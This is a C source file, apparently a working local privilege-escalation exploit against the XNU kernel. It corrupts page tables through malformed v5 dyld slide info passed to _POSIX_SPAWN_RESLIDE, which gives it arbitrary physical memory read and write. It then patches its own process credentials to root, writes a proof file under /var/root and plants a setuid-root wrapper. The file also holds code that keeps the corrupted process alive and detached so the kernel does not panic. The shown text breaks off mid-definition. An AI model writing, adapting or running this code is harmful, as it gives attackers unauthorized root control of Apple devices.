// t_reslide_zf.c -- unprivileged _POSIX_SPAWN_RESLIDE child for the v5 slide walker.
// Inherit fd 3 as the real dyld shared cache. File 0 is fd=-1 anonymous slide-info.
#include <stdint.h>

typedef uint64_t u64;
typedef uint32_t u32;
typedef uint16_t u16;
typedef uint8_t u8;

#ifndef UNUSED
#define UNUSED __attribute__((unused))
#endif

#ifndef START_OFFSET
#define START_OFFSET 0x0
#endif

#ifndef ALT_START_OFFSET
#define ALT_START_OFFSET 0x0
#endif

#ifndef ALT_START_MODE
#define ALT_START_MODE 0
#endif

#ifndef ACTIVE_START_PERIOD
#define ACTIVE_START_PERIOD 1
#endif

#ifndef ACTIVE_START_PHASE
#define ACTIVE_START_PHASE 0
#endif

#ifndef ACTIVE_START_FIRST
#define ACTIVE_START_FIRST 0
#endif

#ifndef ACTIVE_START_LAST
#define ACTIVE_START_LAST 0xffffULL
#endif

#if (ALT_START_OFFSET != 0 && ALT_START_MODE > 0) || (ACTIVE_START_PERIOD > 1) || (ACTIVE_START_FIRST != 0) || (ACTIVE_START_LAST != 0xffffULL)
#define HELPER_NEEDS_CONFIG 1
#else
#define HELPER_NEEDS_CONFIG 0
#endif

#ifndef VALUE_ADD
#define VALUE_ADD 0x4141414141414141ULL
#endif

/* THREE_PAGE_COVER: the OOB write for page i lands at phys(dst_i)+page_starts[i].
 * With a single START_OFFSET every dst only probes ONE of its 3 reachable
 * neighbor pages (dst+1/+2/+3 via 0x4000/0x8000/0xc000). Cycling the per-page
 * offset through all three triples the oracle-L3 collision coverage per dst. */
#ifndef THREE_PAGE_COVER
#define THREE_PAGE_COVER 0
#endif

#ifndef TARGET_SIZE
#define TARGET_SIZE 0x4000
#endif

#ifndef TARGET_MAPS
#define TARGET_MAPS 1
#endif

#ifndef TARGET_FAULT_MAPS
#define TARGET_FAULT_MAPS 0
#endif

#ifndef TARGET_TOUCH_PAGES
#define TARGET_TOUCH_PAGES 0
#endif

#ifndef TARGET_NOAUTH
#define TARGET_NOAUTH 0
#endif

#ifndef TARGET_SPLIT_FILES
#define TARGET_SPLIT_FILES 0
#endif

#ifndef ORACLE_SCAN_AFTER_EACH_MAP
#define ORACLE_SCAN_AFTER_EACH_MAP 0
#endif

#ifndef PTE_ENTRY_INDEX
#define PTE_ENTRY_INDEX 0
#endif

#ifndef PTE_DISTANCE_PAGES
#define PTE_DISTANCE_PAGES 1
#endif

#ifndef READ_OFFSET
#define READ_OFFSET 0
#endif

#ifndef GROOM_PAIRS
#define GROOM_PAIRS 0
#endif

#ifndef KEEP_PATTERN
#define KEEP_PATTERN 0
#endif

#ifndef KEEP_PATTERN_BASE
#define KEEP_PATTERN_BASE 0xabc0000000000000ULL
#endif

#ifndef PREFLT_PAGES
#define PREFLT_PAGES 0
#endif

#ifndef PREFLT_ASCENDING
#define PREFLT_ASCENDING 0
#endif

#ifndef ORACLE_REGIONS
#define ORACLE_REGIONS 0
#endif

#ifndef ORACLE_TRACK_PAGES
#define ORACLE_TRACK_PAGES 2
#endif

#ifndef ORACLE_EXTRA_PAGE_INDEX
#define ORACLE_EXTRA_PAGE_INDEX 0xffffULL
#endif

#ifndef ORACLE_EXTRA_PAGE_TAG
#define ORACLE_EXTRA_PAGE_TAG 4
#endif

#ifndef ORACLE_WITH_HOLES
#define ORACLE_WITH_HOLES 0
#endif

#ifndef ORACLE_HOLE_PAGES
#define ORACLE_HOLE_PAGES 1
#endif

#ifndef ORACLE_DEFER_HOLE_FREE
#define ORACLE_DEFER_HOLE_FREE 0
#endif

#ifndef ORACLE_HOLE_FREE_ORDER
#define ORACLE_HOLE_FREE_ORDER 0
#endif

#ifndef ORACLE_BEFORE_SETUP
#define ORACLE_BEFORE_SETUP 0
#endif

#ifndef ORACLE_STRIDE
#define ORACLE_STRIDE 0x2000000ULL
#endif

#ifndef ORACLE_SENT0
#define ORACLE_SENT0 0x1111000000000000ULL
#endif

#ifndef ORACLE_SENT1
#define ORACLE_SENT1 0x2222000000000000ULL
#endif

#ifndef ORACLE_DUMP_WORDS
#define ORACLE_DUMP_WORDS 0
#endif

#ifndef ORACLE_PTE_SCAN
#define ORACLE_PTE_SCAN 0
#endif

#ifndef ORACLE_PTE_SCAN_WORDS
#define ORACLE_PTE_SCAN_WORDS 64
#endif

#ifndef ORACLE_PTE_SCAN_DUMP_WORDS
#define ORACLE_PTE_SCAN_DUMP_WORDS 8
#endif

#ifndef ORACLE_PTE_WRITE_ALIAS
#define ORACLE_PTE_WRITE_ALIAS 0
#endif

#ifndef ORACLE_PTE_ALIAS_WRITE_LIMIT
#define ORACLE_PTE_ALIAS_WRITE_LIMIT 1
#endif

#ifndef ORACLE_PTE_WRITE_SRC_INDEX
#define ORACLE_PTE_WRITE_SRC_INDEX 1
#endif

#ifndef ORACLE_PTE_WRITE_DST_INDEX
#define ORACLE_PTE_WRITE_DST_INDEX 2
#endif

#ifndef ORACLE_PTE_WRITE_MARKER
#define ORACLE_PTE_WRITE_MARKER 0x8888000000000000ULL
#endif

#ifndef ORACLE_PTE_WRITE_SCAN_ALL
#define ORACLE_PTE_WRITE_SCAN_ALL 0
#endif

#ifndef ORACLE_PTE_EXISTING_ALIAS_SCAN
#define ORACLE_PTE_EXISTING_ALIAS_SCAN 0
#endif

#ifndef ORACLE_PTE_EXISTING_ALIAS_ALLOW_SELF
#define ORACLE_PTE_EXISTING_ALIAS_ALLOW_SELF 0
#endif

#ifndef ORACLE_PTE_OWNER_RESTORE_DST
#define ORACLE_PTE_OWNER_RESTORE_DST 0
#endif

#ifndef ORACLE_PTE_OWNER_MAP_TEST
#define ORACLE_PTE_OWNER_MAP_TEST 0
#endif

#ifndef ORACLE_PTE_OWNER_MAP_ALT_TEST
#define ORACLE_PTE_OWNER_MAP_ALT_TEST 0
#endif

#ifndef ORACLE_PTE_OWNER_MAP_FRESH_ALT_TEST
#define ORACLE_PTE_OWNER_MAP_FRESH_ALT_TEST 0
#endif

#ifndef ORACLE_PTE_OWNER_MAP_INDEX
#define ORACLE_PTE_OWNER_MAP_INDEX 2
#endif

#ifndef ORACLE_PTE_OWNER_MAP_RESTORE
#define ORACLE_PTE_OWNER_MAP_RESTORE 0
#endif

#ifndef ORACLE_PTE_OWNER_MAP_ALT_INDEX
#define ORACLE_PTE_OWNER_MAP_ALT_INDEX 3
#endif

#ifndef ORACLE_PTE_PHYS_SCAN
#define ORACLE_PTE_PHYS_SCAN 0
#endif

#ifndef ORACLE_PTE_PHYS_SCAN_BASE
#define ORACLE_PTE_PHYS_SCAN_BASE 0ULL
#endif

#ifndef ORACLE_PTE_PHYS_SCAN_WINDOW_STRIDE
#define ORACLE_PTE_PHYS_SCAN_WINDOW_STRIDE 0x2000000ULL
#endif

#ifndef WIPE_ARGV_STRINGS
#define WIPE_ARGV_STRINGS 0
#endif

#ifndef RUNTIME_HELPER
#define RUNTIME_HELPER 0
#endif

#ifndef HELPER_SECTION
#define HELPER_SECTION "__TEXT,__const"
#endif

#ifndef ORACLE_PTE_PHYS_SCAN_START_INDEX
#define ORACLE_PTE_PHYS_SCAN_START_INDEX 4
#endif

#ifndef ORACLE_PTE_PHYS_SCAN_PAGES
#define ORACLE_PTE_PHYS_SCAN_PAGES 16
#endif

#ifndef ORACLE_PTE_PHYS_SCAN_CHUNKS
#define ORACLE_PTE_PHYS_SCAN_CHUNKS 1
#endif

#ifndef ORACLE_PTE_PHYS_SCAN_RESTORE
#define ORACLE_PTE_PHYS_SCAN_RESTORE 0
#endif

#ifndef ORACLE_PTE_PHYS_SCAN_REVERSE
#define ORACLE_PTE_PHYS_SCAN_REVERSE 0
#endif

#ifndef ORACLE_PTE_PHYS_SCAN_DUMP
#define ORACLE_PTE_PHYS_SCAN_DUMP 8
#endif

#ifndef ORACLE_PTE_PHYS_SCAN_SEARCH_WORD
#define ORACLE_PTE_PHYS_SCAN_SEARCH_WORD 0
#endif

#ifndef ORACLE_PTE_PHYS_SCAN_WORD
#define ORACLE_PTE_PHYS_SCAN_WORD 0x5f6564696c736572ULL
#endif

#ifndef ORACLE_PTE_PHYS_SCAN_WORD1
#define ORACLE_PTE_PHYS_SCAN_WORD1 0ULL
#endif

#ifndef ORACLE_PTE_PHYS_SCAN_WORD1_ARG
#define ORACLE_PTE_PHYS_SCAN_WORD1_ARG 0
#endif

#ifndef ORACLE_PTE_PHYS_SCAN_WORD_PHASE
#define ORACLE_PTE_PHYS_SCAN_WORD_PHASE 0
#endif

#ifndef ORACLE_PTE_PHYS_SCAN_WORD_STEP
#define ORACLE_PTE_PHYS_SCAN_WORD_STEP 8
#endif

#ifndef PROCNAME_MARKER
#define PROCNAME_MARKER 0
#endif

#ifndef ORACLE_PTE_PHYS_CRED_RELAXED_UIDS
#define ORACLE_PTE_PHYS_CRED_RELAXED_UIDS 0
#endif

#ifndef ORACLE_PTE_PHYS_SCAN_HIT_DUMP_WORDS
#define ORACLE_PTE_PHYS_SCAN_HIT_DUMP_WORDS 0
#endif

#ifndef ORACLE_PTE_PHYS_SCAN_HIT_DUMP_BACK_WORDS
#define ORACLE_PTE_PHYS_SCAN_HIT_DUMP_BACK_WORDS 8
#endif

#ifndef ORACLE_PTE_PHYS_SCAN_HIT_CONTEXT
#define ORACLE_PTE_PHYS_SCAN_HIT_CONTEXT 0
#endif

#ifndef ORACLE_PTE_PHYS_CRED_SCAN
#define ORACLE_PTE_PHYS_CRED_SCAN 0
#endif

/* Collateral-scrub: while we hold arbitrary phys R/W, zero every qword equal to the
 * OOB marker (our VALUE_ADD, -0x4000) across scanned RAM. The slide spray leaves these
 * in other page tables' empty slots; an async kernel walk reads one as a malformed
 * "compressed PTE" and panics @pmap.c:5189. The value is too unusual to be live data. */
#ifndef ORACLE_PTE_PHYS_SCRUB
#define ORACLE_PTE_PHYS_SCRUB 0
#endif

#ifndef ORACLE_PTE_PHYS_SCRUB_VALUE
#define ORACLE_PTE_PHYS_SCRUB_VALUE 0xffffffffffffc000ULL
#endif

#ifndef ORACLE_PTE_PHYS_CRED_PATCH
#define ORACLE_PTE_PHYS_CRED_PATCH 0
#endif

#ifndef ORACLE_PTE_PHYS_CRED_UID
#define ORACLE_PTE_PHYS_CRED_UID 501
#endif

#ifndef ORACLE_PTE_PHYS_CRED_GID
#define ORACLE_PTE_PHYS_CRED_GID 20
#endif

#ifndef ORACLE_PTE_PHYS_CRED_ANY_GID
#define ORACLE_PTE_PHYS_CRED_ANY_GID 0
#endif

#ifndef ORACLE_PTE_PHYS_CRED_MAX_PATCH
#define ORACLE_PTE_PHYS_CRED_MAX_PATCH 8
#endif

#ifndef ORACLE_PTE_PHYS_CRED_RESTORE_MISS
#define ORACLE_PTE_PHYS_CRED_RESTORE_MISS 0
#endif

#ifndef ORACLE_STOP_AFTER_ROOT_HIT
#define ORACLE_STOP_AFTER_ROOT_HIT 0
#endif

#ifndef ORACLE_ROOT_PROOF
#define ORACLE_ROOT_PROOF 0
#endif

#ifndef ORACLE_ROOT_PROOF_PATH
#define ORACLE_ROOT_PROOF_PATH "/var/root/puaf_lpe_root_proof"
#endif

#ifndef ORACLE_EXIT_AFTER_ROOT_PROOF
#define ORACLE_EXIT_AFTER_ROOT_PROOF 0
#endif

#ifndef SURVIVE_LOOP
#define SURVIVE_LOOP 0
#endif

#ifndef SUID_HANDOFF
#define SUID_HANDOFF 0
#endif

#ifndef SUID_WRAPPER_PATH
#define SUID_WRAPPER_PATH "/tmp/lpe_suidwrap"
#endif

#ifndef ABORT_ON_SETUP_FAIL
#define ABORT_ON_SETUP_FAIL 0
#endif

#ifndef ORACLE_PTE_OWNER_MINCORE
#define ORACLE_PTE_OWNER_MINCORE 0
#endif

#ifndef ORACLE_PTE_OWNER_HW_WINDOW
#define ORACLE_PTE_OWNER_HW_WINDOW 0
#endif

#ifndef ORACLE_WRITE_CROSS_ALIAS
#define ORACLE_WRITE_CROSS_ALIAS 0
#endif

#ifndef ORACLE_WRITE_MARKER
#define ORACLE_WRITE_MARKER 0x7777000000000000ULL
#endif

#ifndef ORACLE_RESCAN_ROUNDS
#define ORACLE_RESCAN_ROUNDS 0
#endif

#ifndef ORACLE_RESCAN_SPINS
#define ORACLE_RESCAN_SPINS 0x20000000ULL
#endif

#ifndef SCAN_OFFSET
#define SCAN_OFFSET (START_OFFSET & (PAGE_SZ - 1))
#endif

#ifndef PAGE_STARTS_COUNT
#define PAGE_STARTS_COUNT 256
#endif

#ifndef SR_BASE
#define SR_BASE         0x180000000ULL
#endif

#ifndef SR_MAL_MAP
#define SR_MAL_MAP     0x180040000ULL
#endif

#define PAGE_SZ        0x4000ULL
#define VM_PROT_READ    0x1
#define VM_PROT_ZF      0x10
#define VM_PROT_SLIDE   0x20
#define VM_PROT_NOAUTH  0x40
#define PROT_RW         0x3
#define MAP_PRIVATE_ANON 0x1002
#define MINCORE_INCORE  0x1
#define CTL_KERN        1
#define KERN_PROCNAME   62

__asm__(
".global _start\n"
"_start:\n"
"  mov x29,#0\n"
"  mov x30,#0\n"
"  mov x0,sp\n"
"  mov x9,sp\n"
"  and x9,x9,#-16\n"
"  mov sp,x9\n"
"  bl _cmain\n"
"  mov x16,#1\n"
"  mov x0,#0\n"
"  svc #0x80\n");

static long
sc6(long n, long a, long b, long c, long d, long e, long f)
{
	register long x16 asm("x16") = n;
	register long x0 asm("x0") = a;
	register long x1 asm("x1") = b;
	register long x2 asm("x2") = c;
	register long x3 asm("x3") = d;
	register long x4 asm("x4") = e;
	register long x5 asm("x5") = f;
	asm volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2), "r"(x3), "r"(x4), "r"(x5) : "cc", "memory");
	return x0;
}

static u64
slen(const char *s)
{
	u64 n = 0;
	while (s[n]) {
		n++;
	}
	return n;
}

static void
S(const char *s)
{
	sc6(4, 1, (long)s, slen(s), 0, 0, 0);
}

static char hb[19];
static void
H(u64 v)
{
	hb[0] = '0';
	hb[1] = 'x';
	for (int i = 0; i < 16; i++) {
		int n = (int)((v >> ((15 - i) * 4)) & 0xf);
		hb[2 + i] = (char)(n < 10 ? '0' + n : 'a' + n - 10);
	}
	hb[18] = '\n';
	sc6(4, 1, (long)hb, 19, 0, 0, 0);
}

#if ORACLE_ROOT_PROOF > 0
static u64 ROOT_PROOF_DONE;

static void
root_proof_action(void)
{
	static const char path[] = ORACLE_ROOT_PROOF_PATH;
	static const char msg[] = "xnu reslide LPE proof\n";
	long fd;
	long wr;

	if (ROOT_PROOF_DONE) {
		return;
	}
	ROOT_PROOF_DONE = 1;

	fd = sc6(5, (long)path, 0x601, 0600, 0, 0, 0);
	S("[R] root proof open=");
	H((u64)fd);
	if (fd < 0) {
		return;
	}
	wr = sc6(4, fd, (long)msg, sizeof(msg) - 1, 0, 0, 0);
	S("[R] root proof write=");
	H((u64)wr);
	sc6(6, fd, 0, 0, 0, 0, 0);
}
#endif

static void
survive_forever(void)
{
	/* Hold our corrupted pmap forever WITHOUT tearing it down: never exit,
	 * never execve, never munmap (each triggers pmap teardown -> panic on the
	 * OOB-retargeted PTEs). select(0,NULL,NULL,NULL,NULL) blocks at ~0 CPU.
	 * The parent launcher (clean address space) reaps the shared-cred root. */
	S("[R] survive loop: holding dirty pmap, no teardown\n");
	/* Tell the launcher we're done (root or miss) via a sentinel file so it can stop
	 * polling promptly even on a full STOP_AFTER_ROOT=0 scan. Non-forking syscalls. */
	{
		static const char donep[] = "/tmp/claude_child_done";
		long df = sc6(5, (long)donep, 0x601, 0644, 0, 0, 0); /* open O_WRONLY|O_CREAT|O_TRUNC */
		if (df >= 0) {
			sc6(4, df, (long)"1", 1, 0, 0, 0); /* write */
			sc6(6, df, 0, 0, 0, 0, 0);         /* close */
		}
	}
	/* Drop stdio so the ssh channel EOFs and the launcher/run-host can return.
	 * Otherwise this immortal child holds the ssh stdout pipe open and hangs it.
	 * setsid() at startup + closed fds = the child survives the ssh disconnect
	 * (verified: a setsid+close daemon stays alive after the connection drops),
	 * so it keeps holding its corrupted pmap and never triggers a teardown panic. */
	sc6(6, 0, 0, 0, 0, 0, 0); /* close(stdin)  */
	sc6(6, 1, 0, 0, 0, 0, 0); /* close(stdout) */
	sc6(6, 2, 0, 0, 0, 0, 0); /* close(stderr) */
	for (;;) {
		sc6(93, 0, 0, 0, 0, 0, 0); /* SYS_select: block forever, ~0 CPU */
	}
}

#if SUID_HANDOFF > 0
static void
suid_handoff(void)
{
	static const char wp[] = SUID_WRAPPER_PATH;
	/* root now (own cred patched): make the staged wrapper setuid-root so a fresh
	 * uid-501 process exec'ing it gets a LEGIT root cred (no SMR corruption). */
	sc6(16, (long)wp, 0, 0, 0, 0, 0);     /* chown(wp,0,0) */
	sc6(15, (long)wp, 04755, 0, 0, 0, 0); /* chmod(wp,04755) setuid */
	S("[R] suid handoff chown0+chmod04755: ");
	S(wp);
	S("\n");
}
#endif

static u64
parse_hex(const char *s)
{
	u64 v = 0;
	if (s == 0) {
		return 0;
	}
	if (s[0] == '0' && (s[1] == 'x' || s[1] == 'X')) {
		s += 2;
	}
	while (*s) {
		char c = *s++;
		u64 d;
		if (c >= '0' && c <= '9') {
			d = (u64)(c - '0');
		} else if (c >= 'a' && c <= 'f') {
			d = (u64)(c - 'a' + 10);
		} else if (c >= 'A' && c <= 'F') {
			d = (u64)(c - 'A' + 10);
		} else {
			break;
		}
		v = (v << 4) | d;
	}
	return v;
}

static void
wipe_string(char *s)
{
	if (s == 0) {
		return;
	}
	for (u64 i = 0; s[i] != 0; i++) {
		s[i] = 0;
	}
}

static void UNUSED
wipe_bytes(volatile u8 *p, u64 n)
{
	for (u64 i = 0; i < n; i++) {
		p[i] = 0;
	}
}

static u64 UNUSED
load_le64_bytes(const volatile u8 *p)
{
	u64 v = 0;
	for (u64 i = 0; i < 8; i++) {
		v |= (u64)p[i] << (i * 8);
	}
	return v;
}

static char UNUSED
hex_ch(u64 v)
{
	v &= 0xf;
	return (char)(v < 10 ? '0' + v : 'a' + v - 10);
}

struct shared_file_np {
	int sf_fd;
	u32 sf_mappings_count;
	u32 sf_slide;
};

struct mapping {
	u64 sms_address;
	u64 sms_size;
	u64 sms_file_offset;
	u64 sms_slide_size;
	u64 sms_slide_start;
	u32 sms_max_prot;
	u32 sms_init_prot;
};

struct v5mal {
	u32 version;
	u32 page_size;
	u32 page_starts_count;
	u32 pad;
	u64 value_add;
	u16 page_starts[PAGE_STARTS_COUNT];
};

struct helper_page {
	struct v5mal mal;
	char pad[0x4000 - sizeof(struct v5mal)];
};

#if TARGET_SPLIT_FILES > 0
#define FILES_COUNT (1 + TARGET_MAPS)
#else
#define FILES_COUNT 2
#endif

static struct shared_file_np FILES[FILES_COUNT];
static struct mapping MAPS[1 + TARGET_MAPS];
static u64 CHECK_START;
#if GROOM_PAIRS > 0
static u64 KEEP[GROOM_PAIRS];
#endif
#if ORACLE_REGIONS > 0
static u64 ORACLE_BASES[ORACLE_REGIONS];
#if ORACLE_WITH_HOLES && ORACLE_DEFER_HOLE_FREE
static u64 ORACLE_HOLES[ORACLE_REGIONS * ORACLE_HOLE_PAGES];
#endif
#endif
static u64 PHYS_SCAN_BASE_RUNTIME = ORACLE_PTE_PHYS_SCAN_BASE;
static u64 UNUSED PHYS_SCAN_WORD_RUNTIME;
static u64 UNUSED PHYS_SCAN_WORD1_RUNTIME = ORACLE_PTE_PHYS_SCAN_WORD1;
static u64 UNUSED PROCNAME_MARKER_WORD1;
#if ORACLE_PTE_PHYS_SCAN_RESTORE > 0
static u64 OLD_PHYS_PTES[ORACLE_PTE_PHYS_SCAN_PAGES];
#endif
static void UNUSED
configure_helper(struct helper_page *hp)
{
	hp->mal.version = 5;
	hp->mal.page_size = 16384;
	hp->mal.page_starts_count = PAGE_STARTS_COUNT;
	hp->mal.pad = 0;
	hp->mal.value_add = VALUE_ADD;
#if ALL_STARTS
	for (u64 i = 0; i < PAGE_STARTS_COUNT; i++) {
		u64 active = 1;
		u16 off = START_OFFSET;
#if THREE_PAGE_COVER
		/* cycle dst+1 (0x4000), dst+2 (0x8000), dst+3 (0xc000) across pages */
		off = (u16)(0x4000ULL + 0x4000ULL * (i % 3));
#endif
#if ACTIVE_START_FIRST > 0
		if (i < ACTIVE_START_FIRST) {
			active = 0;
		}
#endif
#if ACTIVE_START_LAST != 0xffffULL
		if (i > ACTIVE_START_LAST) {
			active = 0;
		}
#endif
#if ACTIVE_START_PERIOD > 1
		active = active && ((i % ACTIVE_START_PERIOD) == ACTIVE_START_PHASE);
#endif
		if (!active) {
			hp->mal.page_starts[i] = 0xffff;
			continue;
		}
#if ALT_START_OFFSET != 0 && ALT_START_MODE > 0
		if (ALT_START_MODE == 1) {
			if (i >= PAGE_STARTS_COUNT / 2) {
				off = ALT_START_OFFSET;
			}
		} else if (ALT_START_MODE == 2) {
			if ((i & 1) != 0) {
				off = ALT_START_OFFSET;
			}
		}
#endif
		hp->mal.page_starts[i] = off;
	}
#else
	hp->mal.page_starts[0] = START_OFFSET;
	for (u64 i = 1; i < PAGE_STARTS_COUNT; i++) {
		hp->mal.page_starts[i] = 0xffff;
	}
#endif
}

#if THREE_PAGE_COVER
#if PAGE_STARTS_COUNT != 1024
#error "THREE_PAGE_COVER pattern assumes PAGE_STARTS_COUNT==1024 (build PAGES=1024)"
#endif
/* 0x4000 (== page_size) is rejected by the v5 validator (EINVAL), so cover the
 * two VALID OOB neighbor pages: 0x8000 (dst+2) and 0xc000 (dst+3), both PTE[0].
 * 1024 = 512 cycles of {0x8000,0xc000} -> 512 probes at each of dst+2 and dst+3. */
#define CVR2    0x8000,0xc000,
#define CVR8    CVR2 CVR2 CVR2 CVR2
#define CVR32   CVR8 CVR8 CVR8 CVR8
#define CVR128  CVR32 CVR32 CVR32 CVR32
#define CVR512  CVR128 CVR128 CVR128 CVR128
#define CVR1024 CVR512 CVR512
#endif

#if RUNTIME_HELPER == 0
#if HELPER_NEEDS_CONFIG
static struct helper_page HELPER __attribute__((used, aligned(0x4000), section("__DATA,__data"))) = {
#else
static const struct helper_page HELPER __attribute__((used, aligned(0x4000), section(HELPER_SECTION))) = {
#endif
	.mal = {
		.version = 5,
		.page_size = 16384,
		.page_starts_count = PAGE_STARTS_COUNT,
		.value_add = VALUE_ADD,
#if ALL_STARTS
#if THREE_PAGE_COVER
		.page_starts = { CVR1024 },
#elif ACTIVE_START_PERIOD > 1
		.page_starts = { [0 ... PAGE_STARTS_COUNT - 1] = 0xFFFF },
#else
		.page_starts = { [0 ... PAGE_STARTS_COUNT - 1] = START_OFFSET },
#endif
#else
		.page_starts = { [0] = START_OFFSET, [1 ... PAGE_STARTS_COUNT - 1] = 0xFFFF },
#endif
	},
};
#endif

static u64 UNUSED
setup_helper_page(void)
{
#if RUNTIME_HELPER > 0
	long p = sc6(197, 0, PAGE_SZ, PROT_RW, MAP_PRIVATE_ANON, -1, 0);
	struct helper_page *hp = (struct helper_page *)(u64)p;

	if ((u64)p < 0x100000000ULL) {
		S("[R] helper mmap failed=");
		H((u64)p);
		return 0;
	}
	configure_helper(hp);
	S("[R] helper runtime=");
	H((u64)p);
	return (u64)p;
#else
#if HELPER_NEEDS_CONFIG
	configure_helper(&HELPER);
#endif
	return (u64)&HELPER;
#endif
}

static void UNUSED
setup_procname_marker(void)
{
#if PROCNAME_MARKER > 0
	int mib[2];
	char marker[33];
	u64 pid = (u64)sc6(20, 0, 0, 0, 0, 0, 0);
	u64 seed = (pid << 32) ^ PHYS_SCAN_BASE_RUNTIME ^ 0x9e3779b97f4a7c15ULL;
	u64 seed2 = ~seed ^ 0x6a09e667f3bcc909ULL;

	marker[0] = 'p';
	marker[1] = 'n';
	for (u64 i = 0; i < 14; i++) {
		marker[2 + i] = hex_ch(seed >> ((13 - i) * 4));
	}
	for (u64 i = 0; i < 16; i++) {
		marker[16 + i] = hex_ch(seed2 >> ((15 - i) * 4));
	}
	marker[32] = 0;

	PHYS_SCAN_WORD_RUNTIME = load_le64_bytes((const volatile u8 *)marker);
	PROCNAME_MARKER_WORD1 = load_le64_bytes((const volatile u8 *)marker + 8);

	mib[0] = CTL_KERN;
	mib[1] = KERN_PROCNAME;
	S("[R] procname marker pid=");
	H(pid);
	S("[R] procname marker word0=");
	H(PHYS_SCAN_WORD_RUNTIME);
	S("[R] procname marker word1=");
	H(PROCNAME_MARKER_WORD1);
	S("[R] procname marker sysctl ret=");
	H((u64)sc6(202, (long)mib, 2, 0, 0, (long)marker, sizeof(marker) - 1));

	wipe_bytes((volatile u8 *)marker, sizeof(marker));
	wipe_bytes((volatile u8 *)mib, sizeof(mib));
#endif
}

#if GROOM_PAIRS > 0
static void
groom_phys_neighbor(void)
{
	u64 made = 0;
	for (u64 i = 0; i < GROOM_PAIRS; i++) {
		/* 3-page probe: free page0 (the dst target), watch page2 (= page0 + 0x8000),
		 * which is exactly where the OOB write lands if the pager reuses page0 as a
		 * destination AND the block is physically contiguous. A flipped page2 marker
		 * proves both (free-list reuse + contiguity) -- the deterministic-groom basis. */
		long p = sc6(197, 0, 3 * PAGE_SZ, PROT_RW, MAP_PRIVATE_ANON, -1, 0);
		if ((u64)p < 0x100000000ULL) {
			break;
		}
		volatile u64 *first = (volatile u64 *)(u64)p;                  /* dst target  */
		volatile u64 *mid = (volatile u64 *)((u64)p + PAGE_SZ);
		volatile u64 *third = (volatile u64 *)((u64)p + 2 * PAGE_SZ);  /* = first+0x8000 */
		first[0] = 0;
		mid[0] = 0;
		third[0] = KEEP_PATTERN ? (KEEP_PATTERN_BASE ^ i) : (0xD00D0000ULL ^ i);
		sc6(73, p, PAGE_SZ, 0, 0, 0, 0);   /* free ONLY page0 */
		KEEP[i] = (u64)third;
		made++;
	}
	S("[R] groom made=");
	H(made);
}

static void
scan_groom_hits(void)
{
	u64 hits = 0;
	for (u64 i = 0; i < GROOM_PAIRS; i++) {
		if (KEEP[i] == 0) {
			continue;
		}
		volatile u64 *p = (volatile u64 *)KEEP[i];
		u64 v = p[0];
		u64 expected = KEEP_PATTERN ? (KEEP_PATTERN_BASE ^ i) : 0;
		if (v != expected) {
			if (hits < 8) {
				S("[R] groom hit addr=");
				H(KEEP[i]);
				S("[R] groom hit expected=");
				H(expected);
				S("[R] groom hit value=");
				H(v);
			}
			hits++;
		}
	}
	S("[R] groom hits=");
	H(hits);
}
#endif

static u64 UNUSED
oracle_hole_free_index(u64 i, u64 n)
{
#if ORACLE_HOLE_FREE_ORDER == 1
	return n - 1 - i;
#elif ORACLE_HOLE_FREE_ORDER == 2
	if ((i & 1) == 0) {
		return i >> 1;
	}
	return n - 1 - (i >> 1);
#else
	(void)n;
	return i;
#endif
}

static u64
align_up(u64 v, u64 a)
{
	return (v + a - 1) & ~(a - 1);
}

static void UNUSED
spin_delay(u64 n)
{
	for (volatile u64 i = 0; i < n; i++) {
		asm volatile("" ::: "memory");
	}
}

#if ORACLE_REGIONS > 0
static u64
oracle_extra_sent(u64 idx, u64 which)
{
	u64 tag = (which + 1) * 0x1111ULL;
	return (tag << 48) ^ idx;
}

static int
oracle_decode(u64 v, u64 *idx_out, u64 *which_out)
{
	u64 top = v & 0xffff000000000000ULL;
	u64 idx = v & 0x000000000000ffffULL;
	u64 max_which = ORACLE_TRACK_PAGES < 6 ? ORACLE_TRACK_PAGES : 6;

#if ORACLE_EXTRA_PAGE_INDEX < 2048 && ORACLE_EXTRA_PAGE_TAG < 6
	if (max_which <= ORACLE_EXTRA_PAGE_TAG) {
		max_which = ORACLE_EXTRA_PAGE_TAG + 1;
	}
#endif

	if (idx >= ORACLE_REGIONS) {
		return 0;
	}
	for (u64 which = 0; which < max_which; which++) {
		if (top == (oracle_extra_sent(0, which) & 0xffff000000000000ULL)) {
			*idx_out = idx;
			*which_out = which;
			return 1;
		}
	}
	return 0;
}

static void UNUSED
report_phys_word_hit_context(volatile u8 *base, u64 off, u64 pa)
{
#if ORACLE_PTE_PHYS_SCAN_HIT_CONTEXT > 0
	u64 start = off > 0x100 ? off - 0x100 : 0;
	u64 end = off + 0x100;
	u64 slash = 0;
	u64 space = 0;
	u64 pipe = 0;
	u64 marker2 = 0;

	if (end > PAGE_SZ) {
		end = PAGE_SZ;
	}
	for (u64 i = start; i < end; i++) {
		u8 c = base[i];
		if (c == '/') {
			slash++;
		} else if (c == ' ') {
			space++;
		} else if (c == '|') {
			pipe++;
		}
	}

	S("[R] oracle phys scan hit ctx pa=");
	H(pa);
	S("[R] oracle phys scan hit ctx slash=");
	H(slash);
	S("[R] oracle phys scan hit ctx space=");
	H(space);
	S("[R] oracle phys scan hit ctx pipe=");
	H(pipe);
	if (off >= 0x18) {
		S("[R] oracle phys scan hit ctx minus17=");
		H(load_le64_bytes(base + off - 17));
		S("[R] oracle phys scan hit ctx minus9=");
		H(load_le64_bytes(base + off - 9));
	}
	if (off + 16 <= PAGE_SZ) {
		marker2 = load_le64_bytes(base + off + 8);
		S("[R] oracle phys scan hit ctx plus8=");
		H(marker2);
	}
#if PROCNAME_MARKER > 0
	S("[R] oracle phys scan hit ctx marker2_match=");
	H(marker2 == PROCNAME_MARKER_WORD1);
#endif
#else
	(void)base;
	(void)off;
	(void)pa;
#endif
}

#if ORACLE_PTE_SCAN > 0
#define ARM64_PTE_TYPE_VALID 0x0000000000000003ULL
#define ARM64_PTE_TYPE_MASK 0x0000000000000003ULL
#define ARM64_PTE_ATTRINDXMASK (0x7ULL << 2)
#define ARM64_PTE_NS_MASK 0x0000000000000020ULL
#define ARM64_PTE_APMASK (0x3ULL << 6)
#define ARM64_PTE_SHMASK (0x3ULL << 8)
#define ARM64_PTE_AF 0x0000000000000400ULL
#define ARM64_PTE_NG_MASK 0x0000000000000800ULL
#define ARM64_PTE_PAGE_MASK 0x0000fffffffff000ULL
#define ARM64_PTE_GP_MASK 0x0004000000000000ULL
